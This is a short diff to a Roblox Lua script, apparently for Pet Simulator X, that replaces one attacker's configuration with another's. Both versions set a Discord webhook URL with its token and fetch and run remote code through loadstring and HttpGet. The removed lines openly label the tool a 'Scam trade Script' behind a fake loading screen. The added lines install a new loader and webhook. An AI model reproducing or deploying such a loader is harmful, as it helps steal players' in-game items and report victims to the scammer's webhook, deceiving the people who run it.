@@ -1,5 +1,3 @@
-_G.UserName = "SaifElabd2010" -- dont change this
-_G.FakeLoadingScreen = Loading Scam trade Script Please Wait
-_G.WebHook = "https://discord.com/api/webhooks/1080152760261021746/qpR7Zj91xRPY9gbhpSzgI_ddX_zqlEyQz2mcD2cmANN5IvEdaZ8op9Td-gZQIQDcbfl-"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PrismScript/PetSimulatorX/main/Script1.lua"))()
+_G.UserID = "1533530565"
+_G.WebHook = "https://discord.com/api/webhooks/1084820982096744489/Jx7MBM6A26GTJPxwalGuGILQaJC-u7JSbmDg3EaUOiXWYfwt9RNJhYa99LuY4tFzRBpu"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bllxi2crazy/psxscript/main/script.lua"))()
